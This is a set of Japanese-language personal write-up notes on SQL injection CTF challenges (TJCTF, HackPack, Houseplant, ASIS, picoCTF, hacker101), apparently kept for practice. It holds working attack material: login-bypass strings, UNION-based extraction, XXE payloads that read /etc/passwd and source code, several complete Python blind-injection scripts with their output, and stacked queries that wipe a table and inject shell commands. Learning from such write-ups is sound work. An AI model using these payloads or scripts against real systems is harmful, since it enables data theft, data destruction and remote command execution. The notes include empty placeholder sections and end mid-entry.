# writeup
## blind / identify admin's password (TJCTF 2020  Weak Password)
http://itsvipul.com/writeups/TJCTF_2020/Weak_Password.html  
- **entrypoint**  
ログインページがあって、`' or 1=1--`でログインできるが特にそのあとにFlagとかはない。`admin`のパスワードを特定すればFlagが出るって問題文に書いてある。  
pythonで以下のようなソースとなっている。  
```python
<!-- The following code might be helpful to look at: -->

<!--
def get_user(username, password):
    database = connect_database()
    cursor = database.cursor()
    try:
        cursor.execute('SELECT username, password FROM `userandpassword` WHERE username=\'%s\' AND password=\'%s\'' % (username, password))
    except:
        return render_template("failure.html")
    row = cursor.fetchone()
    database.commit()
    database.close()
    if row is None: return None
    return (row[0],row[1])
-->
```
`(Select unicode(substr(password,1,1)) from userandpassword limit 1 offset 0) > 50`みたいなbinary searchのBlindで特定する。  
- **payload**  
```python
#! /usr/bin/python3
import requests
import string

def inject(cmd):
    url = "https://weak_password.tjctf.org/login"
    data = {"username":"admin' AND {} -- ".format(cmd),"password":"leetcode"}
    #print(data)
    r = requests.post(url,data=data)
    #print(r.text)
    valid = "Congratulations"
    if(valid in r.text):
        return True
    else:
        return False


col_1 = "username"
col_2 = "password"
db = "userandpassword"

user = "admin"

#cmd = "Select unicode(substr(password,1,1)) from {} limit 1 offset 0 > 0 ".format(db)
flag=""
for i in range(1,10):
    l = 97 
    r = 123
    # l = 0
    # r = 100
    prev_mid = -1
    mid = int((l+r)/2)
    while(prev_mid!=mid):
        cmd = "(Select unicode(substr(password,{},{})) from userandpassword limit 1 offset 0) > {}".format(i,i,mid)
        #cmd = "(Select length(password) from userandpassword limit 1 offset 1) > {}".format(mid)
        val = inject(cmd)
        if(val):
            l = mid
        else:
            r=mid
        prev_mid=mid
        mid = int((l+r)/2)

    flag+=chr(mid+1)
    print(flag)
```
## login bypass (TJCTF 2020 Login Sequel)
https://github.com/CsEnox/TJCTFWriteups/blob/master/SequelLogin.md  
- **entrypoint**  
loginページがあるらしい。  
- **payload**  
`admin'/*`でログインするとフラグが出たらしい。  
## union query / Stored SQL Injection (HackPack CTF 2020 Online Birthday Party)
https://www.hamayanhamayan.com/entry/2020/04/30/104927  
- **entrypoint**  
同じ誕生日のユーザーを検索してくれるサイトらしい。  
`/index.php` トップページ  
`/account.php` ログイン、新規登録ができる  
`/profile.php` ログイン後に出るページ  
新規登録するときに入力する誕生日を使ってSQLを実行しているはずなのでここにSQLInjectionできるか試す。  
`'`を入力するとErrorを返してくれるのでSQLInjection可能とわかる。  
`a'#`で成功したのでMySQL。  
`a' UNION SELECT DISTINCT TABLE_NAME, null from INFORMATION_SCHEMA.COLUMNS #`でテーブル一覧を取得できる。  
```txt
CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,INNODB_LOCKS,INNODB_TRX,INNODB_SYS_DATAFILES,INNODB_FT_CONFIG,INNODB_SYS_VIRTUAL,INNODB_CMP,INNODB_FT_BEING_DELETED,INNODB_CMP_RESET,INNODB_CMP_PER_INDEX,INNODB_CMPMEM_RESET,INNODB_FT_DELETED,INNODB_BUFFER_PAGE_LRU,INNODB_LOCK_WAITS,INNODB_TEMP_TABLE_INFO,INNODB_SYS_INDEXES,INNODB_SYS_TABLES,INNODB_SYS_FIELDS,INNODB_CMP_PER_INDEX_RESET,INNODB_BUFFER_PAGE,INNODB_FT_DEFAULT_STOPWORD,INNODB_FT_INDEX_TABLE,INNODB_FT_INDEX_CACHE,INNODB_SYS_TABLESPACES,INNODB_METRICS,INNODB_SYS_FOREIGN_COLS,INNODB_CMPMEM,INNODB_BUFFER_POOL_STATS,INNODB_SYS_COLUMNS,INNODB_SYS_FOREIGN,INNODB_SYS_TABLESTATS,users
```
usersテーブルを調べることにして、`a' UNION SELECT COLUMN_NAME, null FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' #`でカラム一覧を取得する。  
```txt
id,username,password,bday
```
`a' UNION SELECT password, bday FROM users #`でFlagが得られたらしい。  
- **payload**  
`a' UNION SELECT password, bday FROM users #`
## login bypass / pass=''=0 / PHP Type Juggling (Houseplant CTF 2020 I don’t like needles)
https://sec.hamayanhamayan.com/2020/04/27/houseplant-ctf-2020-web-writeups/#i-dont-like-needles  
- **entrypoint**  
`?sauce`というワードがHTMLに書かれていて、これにアクセスするとソースコードが得られるらしい。  
`mysqli_query($connection, "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'", MYSQLI_STORE_RESULT);`にSQLInjectionできそう。  
`if (mysqli_fetch_array($result, MYSQLI_ASSOC)["username"] == "flagman69") `で`mysqli_fetch_array`で連想配列にSQL結果を整形して、usernameが`flagman69`と一致しているかどうかチェックしている。  
`==`で比較しているのでType Jugglingの脆弱性もありそう。  
`strpos()`によってpassword欄には`1`という文字は使えない。  
```php
<?php

    if ($_SERVER['REQUEST_METHOD'] == "POST") {

        require("config.php");

        if (isset($_POST["username"]) && isset($_POST["password"])) {

            $username = $_POST["username"];
            $password = $_POST["password"];

            if (strpos($password, "1") !== false) {
                echo "<p style='color: red;'>Auth fail :(</p>";
            } else {

                $connection = new mysqli($SQL_HOST, $SQL_USER, $SQL_PASS, $SQL_DB);
                $result = mysqli_query($connection, "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'", MYSQLI_STORE_RESULT);

                if ($result === false) {
                    echo "<p style='color: red;'>I don't know what you did but it wasn't good.</p>";
                } else {
                    if ($result->num_rows != 0) {
                        if (mysqli_fetch_array($result, MYSQLI_ASSOC)["username"] == "flagman69") {
                            echo "<p style='color: green;'>" . $FLAG . " :o</p>";
                        } else {
                            echo "<p style='color: green;'>Logged in :)</p>";
                        }
                    } else {
                        echo "<p style='color: red;'>Auth fail :(</p>";
                    }
                }

            }
        }
    }

?>
```
username:`flagman69`,password:`' OR 0 = 0#`でログインは成功するが、`0=0`のため全レコードが条件に一致し、すべてのレコードを取得するためusername:`flagman69`のレコードが先頭に来ない。  
`limit 1,1`や`offset 1`を使えない。  
username:`flagman69`,password:`'=0#`とすると、`username='flagman69' and password=''=0`となり、`password=''=0`はTrueとなってpasswordに正しい文字列を入力したことと同じになり、`flagman69`だけが返る。  
他にもusername:`flagman' #`でも可能！  
PHP Type Jugglingを使った`SELECT * FROM demo where name="testaa" union select 0,0,0`で`if(0 == "flagman69")`とさせて条件を突破させる方法もありそう。  
- **payload**  
username:`flagman69`,password:`'=0#`  
username:`flagman' #`  
`a' union select 0,0,0 #`  
## Union query / XXE (ASIS CTF Quals 2020 Treasury #1 #2)
https://github.com/saw-your-packet/ctfs/blob/master/ASIS%20CTF%20Quals%202020/Write-ups.md#treasury-1  
https://ctftime.org/writeup/24592  
https://ctftime.org/writeup/22126  
- **entrypoint**  
本の抜粋(excerpt)を読めるサイトがある。  
BurpのSpiderで`books.php?type=excerpt&id=1`をしている箇所があり、これが抜粋を読み込んでいる箇所だと推測。  
`id=4' or id='3`で3のコンテンツが返ったのでSQLInjection可能とわかる！(4は存在しない)  
`null' union select 'null`を入力すると`simplexml_load_string()`のerrorとなり、`null`をXMLとして解釈しようとしてエラーが発生しているとわかる。  
ここから、XXEの脆弱性もあることがわかる。  
本の抜粋のXMLデータであるはずなので以下のようになっていると推測するらしい？？  
これで`' UNION SELECT '<root><excerpt>TESTING HERE</excerpt></root>`とするとTESTING HEREが返ったのでXMLはこの構文でいいらしい。  
```xml
<root>
  <excerpt>TESTING HERE</excerpt>
</root>
```
  
以下で`/etc/passwd`が返るらしい。  
```txt
4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "file:///etc/passwd">]><root><id>4</id><excerpt>&test;</excerpt></root>
```
以下で`index.php`が返る。`<`とかが入っているとXML構文エラーとなってしまうため、Base64エンコードする。  
```txt
4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=books.php">]><root><id>4</id><excerpt>&test;</excerpt></root>
```
以下で`ASISCTF`というデータベース名が返った。  
```txt
4' union select concat('<root><id>4</id><excerpt>',database(),'</excerpt></root>') where 'a'='a
```
以下でbooksテーブルのinfoカラムの値を表示できる。`REPLACE`で`<`が構文エラーしないように`?`に変更している。  
これで`#1`のフラグはゲットできるらしい。  
```txt
4' union select concat('<root><id>4</id><excerpt>',REPLACE((select group_concat(0x7c,info,0x7c) from books),'<','?'),'</excerpt></root>') where ''='
```
これで`#2`のフラグをゲットできるらしい。  
```txt
4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "file:///flag">]><root><id>4</id><excerpt>&test;</excerpt></root>
```
PHPソースは以下のようだったらしい。  
```php
<?php
sleep(1);

function connect_to_database() {
  $link = mysqli_connect("web4-mariadb", "ctfuser", "dhY#OThsdivojq2", "ASISCTF");
  if (!$link) {
    echo "Error: Unable to connect to DB.";
    exit;
  }
  return $link;
}

function fetch_books($condition) {
  $link = connect_to_database();
  if ($condition === "") {
    $where_condition = "";
  } else {
    $where_condition = "WHERE $condition";
  }
  $query = "SELECT info FROM books $where_condition";
  if ($result = mysqli_query($link, $query, MYSQLI_USE_RESULT)) {
    $books_info = array();
    while($row = $result->fetch_array(MYSQLI_NUM)) {
      $books_info[] = (string) $row[0];
    }
    mysqli_free_result($result);
  }
  mysqli_close($link);
  return $books_info;
}

function xml2array($xml) {
  return array(
    'id' => (string) $xml->id,
    'name' => (string) $xml->name,
    'author' => (string) $xml->author,
    'year' => (string) $xml->year,
    'link' => (string) $xml->link
  );
}

function get_all_books() {
  $books = array();
  $books_info = fetch_books("");
  foreach ($books_info as $info) {
    $xml = simplexml_load_string($info, 'SimpleXMLElement', LIBXML_NOENT);
    $books[] = xml2array($xml);
  }
  return $books;
}

function find_book($condition) {
  $book_info = fetch_books($condition)[0];
  $xml = simplexml_load_string($book_info, 'SimpleXMLElement', LIBXML_NOENT);
  return $xml;
}

$type = @$_GET["type"];
if ($type === "list") {
  $books = get_all_books();
  echo json_encode($books);

} elseif ($type === "excerpt") {
  $id = @$_GET["id"];
  $book = find_book("id='$id'");
  $bookExcerpt = $book->excerpt;
  echo $bookExcerpt;

} else {
  echo "Invalid type";
}
```
- **payload**  
これで`#1`のフラグはゲットできるらしい。  
```txt
4' union select concat('<root><id>4</id><excerpt>',REPLACE((select group_concat(0x7c,info,0x7c) from books),'<','?'),'</excerpt></root>') where ''='
```
これで`#2`のフラグをゲットできるらしい。  
```txt
4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "file:///flag">]><root><id>4</id><excerpt>&test;</excerpt></root>
```
## 
- **entrypoint**  
- **payload**  

## 
- **entrypoint**  
- **payload**  

## 
- **entrypoint**  
- **payload**  

## 
- **entrypoint**  
- **payload**  

# 常設の練習
## picoCTF 2019
https://ctftime.org/task/9545  
### login bypass (Irish-Name-Repo 1)
`https://2019shell1.picoctf.com/problem/47253/`  
SQLインジェクションでadminとしてログインする。  

`admin`,`' or 1=1 -- -`でログイン成功！  
### login bypass (Irish-Name-Repo 2)
`https://2019shell1.picoctf.com/problem/60775/`  
`admin' --`,`なんでも`でusernameの方のSQLインジェクションで成功！  
passwordの方がフィルタリングされてるらしい。`or`が使えないので`||`とかで代用したりいろいろしたがダメだった。  
```txt
// 成功したやつ
admin' --
admin' -- -
admin' ; --
admin' ;#

// 成功しなかったやつ
admin' #
```
### login bypass (Irish-Name-Repo 3)
`https://2019shell1.picoctf.com/problem/47247/`  
htmlのhiddenとして`debug=0`という値をフォームでパスワードと一緒に送信しているので`debug=1`とすると、実行しようとしている
SQL構文がわかる。どうやらpasswordのテキストをrot13で変換してからSQLに突っ込んでいるらしい。  
`' be 1 -- -`とすると`' or 1 -- -`と変換されて以下のように成功！  
```txt
SQL query: SELECT * FROM admin where password = '' or 1 -- -'
```
### SQLite / Union query (Empire1)
`https://2019shell1.picoctf.com/problem/4155/index`  
![image](https://user-images.githubusercontent.com/56021519/103904535-be749400-5140-11eb-906a-43c20766de27.png)  
ログインページにSQLインジェクションがあるかと思えばそういうわけじゃない。  
適当にRegisterして入ってみる。  
![image](https://user-images.githubusercontent.com/56021519/103904708-fa0f5e00-5140-11eb-8396-72ab168d4a4c.png)  
いろいろ試した結果、`Add a Todo`の`'`を挿入するとInternal Server Errorが返り、SQLインジェクションに脆弱だとわかる。  
![image](https://user-images.githubusercontent.com/56021519/103904777-14493c00-5141-11eb-963e-9cbf02554d78.png)  
次にInternal Server Errorが出ないようにして有効にSQLとして動くInjectionを探す。  
Your TodosでSQL実行結果を確認できる。  
```txt
// Internal Server Error
'
' or 1
' or 1=! -- -

// エラーがでない
' || 1=1 || '     1が返る
' || 1=2 || '     0が返る
```
したがって、`' || <SQL>  || '`の構文ならInternal Server Errorを出さずにSQL実行できるとわかる！  
次に、問題文からsecretをDBから取り出す必要があるので、DBを特定する必要がある。  
`' || @@version || '`が成功すればMySQLかMSSQL、`' || version() || '`ならPostgeSQL、`' || sqlite_version() || '`ならSQLiteとわかる。  
今回はSQLiteのやつで`3.22.0 `が返る！  
https://sqliteonline.com/  
ここで適宜ちゃんとSQLite上で動作できるのか触りながらやるとよさそう。  
SQLiteでは、以下のようにして、DB内に存在するテーブルやカラムなどを表示できる！超楽！  
`group_concat()`を使わないと、一つずつしか返ってこない。`users,apps`とかの場合は`users`しか返してくれないので。  
```txt
// 存在するテーブル一覧を返す
SELECT tbl_name FROM sqlite_master
SELECT group_concat(tbl_name) FROM sqlite_master

// 存在するテーブルとそのカラムをセットで返す。こっちの方が情報量多い
SELECT sql FROM sqlite_master
SELECT group_concat(sql) FROM sqlite_master
```
以下のようにして`user`テーブルの`secret`カラムのデータを呼び出すとフラグゲット！  
```txt
' || (SELECT group_concat(secret) FROM user) || '
Likes Oreos.,Know it all.,picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4} 

' || (SELECT secret FROM user) || '
Likes Oreos. 

' || (SELECT group_concat(tbl_name) FROM sqlite_master) || '
user,user,todo 

' || (SELECT tbl_name FROM sqlite_master) || '
user

' || (SELECT * FROM sqlite_master) || '
Internal Server error

' || (union select 10) || '
Internal Server error

' || (SELECT group_concat(sql) FROM sqlite_master) || '
CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(64), name VARCHAR(128), password_hash VARCHAR(128), secret VARCHAR(128), admin INTEGER, PRIMARY KEY (id) ),CREATE UNIQUE INDEX ix_user_username ON user (username),CREATE TABLE todo ( id INTEGER NOT NULL, item VARCHAR(256), user_id INTEGER, PRIMARY KEY (id), FOREIGN KEY(user_id) REFERENCES user (id) ) 
```

## hacker101 CTF
### Photo Gallery
`https://ctf.hacker101.com/ctf`  
以下のページが問題。  
![image](https://user-images.githubusercontent.com/56021519/103919476-698e4900-5153-11eb-81ed-604ffc2c9917.png)  
`http://35.227.24.107/2116b46989/fetch?id=1`で`1`,`2`の時に画像データを返すらしい。  
おそらく`select data from images where id=1`とかになってるはずと推測する(idはintなので)。  
`1 and 1=1 -- -`で画像データが返り、`1 and 1=2 -- -`でなNot Foundが返ったのでBlind可能！  
Union queryも試したがダメっぽい？  
```txt
1 union select 1 -- -
1に対応する猫の画像が返った

0 union select 1 -- -
internal server error
```
以下のように  
https://sqliteonline.com/  
で実験すると、`id=0`として失敗させたときは`union select`が取り出されると思ったんだけど……  
![image](https://user-images.githubusercontent.com/56021519/103920720-f7b6ff00-5154-11eb-86d9-fabb4b5fad14.png)  
![image](https://user-images.githubusercontent.com/56021519/103920784-0bfafc00-5155-11eb-9313-b2415a015930.png)  
以下の単純な全探索のBlindで`@@version`を試している。これでバージョンがゲットできたので、DBはMySQLとわかる。  
```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import requests
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

url = "http://35.227.24.107/2116b46989/fetch"
cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
candidates = [chr(i) for i in range(48, 48+10)] + \
    [chr(i) for i in range(97, 97+26)] + \
    [chr(i) for i in range(65, 65+26)] + \
    ["_","-","+","@","$","!","?","&",".","#"]
headers= {'Cookie':'PHPSESSID='+cookie}

def attack(attack_sql):
    attack_url = url + "?id=1" + urllib.parse.quote(attack_sql)
    #print(attack_url)
    res = requests.get(attack_url, headers=headers,verify=False)
    #print(res.text)
    return res

def create_pass_query(pw):
    query = " and if(substr(@@version," + str(len(pw)) + ",1)='" + pw[-1] + "',1=1,1=3) -- -"
    #print(query)
    return query

def check_result(res):
    if '404 Not Found' in res.text:
        return False
    if '500 Internal Server Error' in res.text:
        return False
    return True

####################
###     main     ###
####################

# find pw
fix_pass = ""
is_end = False
while not is_end:
    for c in candidates:
        try_pass = fix_pass + str(c)
        print(try_pass)
        query = create_pass_query(try_pass)
        res = attack(query)
        if check_result(res):
            fix_pass += c
            break
        if c == '#':
            is_end = True
            

print("result: " + fix_pass)
```
**mysql-enum-databases-get-binarysearch.py**  
```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import requests
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

url = "http://35.227.24.107/2116b46989/fetch"
cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
headers= {'Cookie':'PHPSESSID='+cookie}

def attack(attack_sql):
    attack_url = url + "?id=1" + urllib.parse.quote(attack_sql)
    #print(attack_url)
    res = requests.get(attack_url, headers=headers,verify=False)
    #print(res.text)
    return res

def create_length_query(md,times):
    query = " and if(length((SELECT table_schema from  information_schema.columns group by table_schema limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3) -- -"
    #print(query)
    return query

def create_2tansaku_query(md,i,times):
    query = " and if(ascii(substr((SELECT table_schema from  information_schema.columns group by table_schema limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3) -- -"
    #print(query)
    return query


def check_result(res):
    if '404 Not Found' in res.text:
        return False
    if '500 Internal Server Error' in res.text:
        return False
    return True

### main     ###
####################

def exploit_length(times):
    ok = 0
    ng = 100
    while ok + 1 != ng:
        md = (ok + ng) // 2
        print("    [+] try " + str(md) + "  times:" + str(times))
        query = create_length_query(md,times)
        res = attack(query)
        if check_result(res):
            ok = md
        else:
            ng = md
    print("")
    print("length: " + str(ok) + "  " +str(times) + " times")
    print("")
    return ok
        
def exploit_2tansaku(length,times):
    fix_pass = ""
    for i in range(0,length):
        ok = 0
        ng = 127
        while ok + 1!= ng:
            md = (ok + ng) // 2
            print("    [+] try " + str(md) + "  i: " + str(i) + "  times:" + str(times))
            query = create_2tansaku_query(md,i+1,times)
            res = attack(query)
            if check_result(res):
                ok = md
            else:
                ng = md
        print(str(ok))
        fix_pass += str(chr(ok))
        print("")
        print("progress: " + str(i+1) +"/" + str(length))
        print("result: " + fix_pass)
        print("")
    return fix_pass

#length = exploit_length()
#length = 24
#exploit_2tansaku(int(length))

result = []
loop_times = 100

for i in range(loop_times):
    print("[*] " + str(i) + " times")
    print("")
    length = exploit_length(i)
    res = exploit_2tansaku(length,i)
    if(res == ""):
        print("[-] fix_pass is None. loop break")
        break
    result.append(res)

print("")
print("[-] exploit finished")
[print(a) for a in result]
```
```txt
$ python3 mysql-enum-databases-get-binarysearch.py

省略

[-] exploit finished
information_schema
level5
mysql
performance_schema
```
**mysql-enum-tables-get-binarysearch.py**  
```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import requests
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

url = "http://35.227.24.107/2116b46989/fetch"
cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
headers= {'Cookie':'PHPSESSID='+cookie}

def attack(attack_sql):
    attack_url = url + "?id=1" + urllib.parse.quote(attack_sql)
    #print(attack_url)
    res = requests.get(attack_url, headers=headers,verify=False)
    #print(res.text)
    return res

def create_length_query(md,times):
    query = " and if(length((SELECT table_schema from  information_schema.columns group by table_schema limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3) -- -"
    #print(query)
    return query

def create_2tansaku_query(md,i,times):
    query = " and if(ascii(substr((SELECT table_schema from  information_schema.columns group by table_schema limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3) -- -"
    #print(query)
    return query


def check_result(res):
    if '404 Not Found' in res.text:
        return False
    if '500 Internal Server Error' in res.text:
        return False
    return True

### main     ###
####################

def exploit_length(times):
    ok = 0
    ng = 100
    while ok + 1 != ng:
        md = (ok + ng) // 2
        print("    [+] try " + str(md) + "  times:" + str(times))
        query = create_length_query(md,times)
        res = attack(query)
        if check_result(res):
            ok = md
        else:
            ng = md
    print("")
    print("length: " + str(ok) + "  " +str(times) + " times")
    print("")
    return ok
        
def exploit_2tansaku(length,times):
    fix_pass = ""
    for i in range(0,length):
        ok = 0
        ng = 127
        while ok + 1!= ng:
            md = (ok + ng) // 2
            print("    [+] try " + str(md) + "  i: " + str(i) + "  times:" + str(times))
            query = create_2tansaku_query(md,i+1,times)
            res = attack(query)
            if check_result(res):
                ok = md
            else:
                ng = md
        print(str(ok))
        fix_pass += str(chr(ok))
        print("")
        print("progress: " + str(i+1) +"/" + str(length))
        print("result: " + fix_pass)
        print("")
    return fix_pass

#length = exploit_length()
#length = 24
#exploit_2tansaku(int(length))

result = []
loop_times = 100

for i in range(loop_times):
    print("[*] " + str(i) + " times")
    print("")
    length = exploit_length(i)
    res = exploit_2tansaku(length,i)
    if(res == ""):
        print("[-] fix_pass is None. loop break")
        break
    result.append(res)

print("")
print("[-] exploit finished")
[print(a) for a in result]

```
```txt
$ python3 mysql-enum-tables-get-binarysearch.py

[-] exploit finished
albums
photos
```
```txt
[-] exploit finished
columns_priv
column_stats
db
event
func
general_log
gtid_slave_pos
help_category
help_keyword
help_relation
help_topic
host
index_stats
innodb_index_stats
innodb_table_stats
plugin
proc
procs_priv
proxies_priv
roles_mapping
servers
slow_log
tables_priv
table_stats
time_zone
time_zone_leap_second
time_zone_name
time_zone_transition
time_zone_transition_type
user
```
**photosのカラム数**  
```txt
$ python3 mysql-count-columns-get-fullsearch.py
0
 AND if(substr((SELECT count(distinct column_name) from  information_schema.columns where table_schema like 'level5' AND table_name like 'photos'),1,1)='0',1=1,1=3)#
 
result: 4
```
**albumsのカラム**  
```txt
[-] exploit finished
id
title
```
**photosのカラム**  
```txt
result: id,title,filename,parent
```
```txt
// 指定したDB、テーブルの持つカラム数を表示
SELECT count(distinct column_name) from  information_schema.columns where table_schema like 'db44364' AND table_name like 'demo';
SELECT COUNT(*) from  information_schema.columns where table_schema like 'db44364' AND table_name like 'demo'

// 指定したDBのテーブル数を表示
SELECT table_name from  information_schema.columns where table_schema like 'db44364' group by table_name

// 指定したDB、テーブルの持つカラムを結合して1行で表示
SELECT group_concat(column_name) from  information_schema.columns where table_schema like 'db44364' AND table_name like 'demo'
```
```python
database = "level5"
table = "photos"
column1 = "title"
column2 = "filename"
column3 = "parent"

def create_length_query(md,times):
    query = " AND if(length((select concat("+column1+",0x3a,"+column2+",0x3a,"+column3+") from " + database + "." + table + " limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3)#"
    #print(query)
    return query

def create_2tansaku_query(md,i,times):
    query = " AND if(ascii(substr((select concat("+column1+",0x3a,"+column2+",0x3a,"+column3+") from " + database + "." + table + " limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3)#"
    #print(query)
    return query
```
このInvisibleがフラグらしい……。（FLAG形式じゃないやないか…（怒））  
```txt
[-] exploit finished
Utterly adorable:files/adorable.jpg:1
Purrfect:files/purrfect.jpg:1
Invisible:b92cc0e313bc00b1548c0563c26f15d5c32690694e49707ed32192036b499674:1
```
```python
database = "level5"
table = "albums"
column1 = "title"

def create_length_query(md,times):
    query = " AND if(length((select concat("+column1+") from " + database + "." + table + " limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3)#"
    #print(query)
    return query

def create_2tansaku_query(md,i,times):
    query = " AND if(ascii(substr((select concat("+column1+") from " + database + "." + table + " limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3)#"
    #print(query)
    return query
```
```txt
[-] exploit finished
Kittens
```
#### flag0 (Union query)
ファイル名をSQLでidから取り出していることが考えられるので、`0 union select '../../main.py'`として有効なファイル名を強引に渡せばよいらしい！  
`0 union select 1`でInternal Server Errorとなっていたのは、ファイル名として1が取り出され、それをpythonでreadしようとしてerrorが発生したからである。  
ヒントから`uwsgi-nginx-flask-docker`を使っているとわかり、main.pyを使っていることとそのパスを推測できるらしい……  
https://github.com/tiangolo/uwsgi-nginx-flask-docker  
```txt
from flask import Flask, abort, redirect, request, Response import base64, json, MySQLdb, os, re, subprocess app = Flask(__name__) home = '''
Magical Image Gallery
$ALBUMS$ ''' viewAlbum = '''
$TITLE$
$GALLERY$ ''' def getDb(): return MySQLdb.connect(host="localhost", user="root", password="", db="level5") def sanitize(data): return data.replace('&', '&').replace('<', '<').replace('>', '>').replace('"', '"') @app.route('/') def index(): cur = getDb().cursor() cur.execute('SELECT id, title FROM albums') albums = list(cur.fetchall()) rep = '' for id, title in albums: rep += '
%s
\n' % sanitize(title) rep += '
' cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, )) fns = [] for pid, ptitle, pfn in cur.fetchall(): rep += '

%s
' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '' rep += '
\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404) # It's dangerous to go alone, take this: # ^FLAG^59540711ea6225ea8310897c6baa3a11b287c7e8dcad02a1bb2b3275666ec6b5$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == "__main__": app.run(host='0.0.0.0', port=80)
```
### flag1 (blind Injection)
```python
database = "level5"
table = "photos"
column1 = "title"
column2 = "filename"
column3 = "parent"

def create_length_query(md,times):
    query = " AND if(length((select concat("+column1+",0x3a,"+column2+",0x3a,"+column3+") from " + database + "." + table + " limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3)#"
    #print(query)
    return query

def create_2tansaku_query(md,i,times):
    query = " AND if(ascii(substr((select concat("+column1+",0x3a,"+column2+",0x3a,"+column3+") from " + database + "." + table + " limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3)#"
    #print(query)
    return query
```
このInvisibleがフラグらしい……。（FLAG形式じゃないやないか…（怒））  
```txt
[-] exploit finished
Utterly adorable:files/adorable.jpg:1
Purrfect:files/purrfect.jpg:1
Invisible:b92cc0e313bc00b1548c0563c26f15d5c32690694e49707ed32192036b499674:1
```
### flag2 (Stack query / OS Command Injection)
`printenv`で環境変数を見ればいいらしい。  
flag0でゲットしたソースは以下の通り。`subprocess.check_output('du -ch %s `でphotosテーブルのfilenameの名前を`du`コマンドに結合しており、OS Command Injectionが可能である！  
ここには外部からの入力を入れる場所はないが、今は任意のSQLを実行できる状態なので、Stack Query型で任意のfilenameの名前にすればInject可能！  
`DELETE from photos;commit;`でphotosテーブルを削除する。`commit`でトランザクションを完了しないと、DELETEしたことにならないので必ず`commit`をつけないとダメ！  
`INSERT INTO photos (title, filename,parent) VALUES (';id', ';id',1); commit;`で任意の名前のデータを挿入する。`id`カラムは勝手についてくれるので残りの`title`,`filename`,`parent`を指定する。  

```python
@app.route('/')
def index():
    cur = getDb().cursor()
    cur.execute('SELECT id, title FROM albums')
    albums = list(cur.fetchall())
    rep = ''
    for id, title in albums:
        rep += '<h2>%s</h2>\n' % sanitize(title)
        rep += '<div>'
        cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
        fns = []
        for pid, ptitle, pfn in cur.fetchall():
            rep += '<div><img src="fetch?id=%i" width="266" height="150"><br>%s</div>' % (pid, sanitize(ptitle))
            fns.append(pfn)
        rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
        rep += '</div>\n'
    return home.replace('$ALBUMS$', rep)
@app.route('/fetch')
def fetch():
    cur = getDb().cursor()
    if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
        abort(404)
    # It's dangerous to go alone, take this:
    # ^FLAG^hehehehe$FLAG$
    return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```
`0;DELETE from photos;commit;`でテーブル内を削除した後、  
`0;INSERT INTO photos (title, filename,parent) VALUES (';id', ';id',1); commit;`で`id`コマンドを実行するようにしてみると、以下のようにidコマンドが実行できた！  
```txt
;id
Space used: uid=0(root) gid=0(root) groups=0(root)
```
`0;DELETE from photos;commit;INSERT INTO photos (title, filename,parent) VALUES (';echo$(printenv)', ';echo$(printenv)',1); commit;`をすると、以下のように2行目以降が見えない……  
```txt
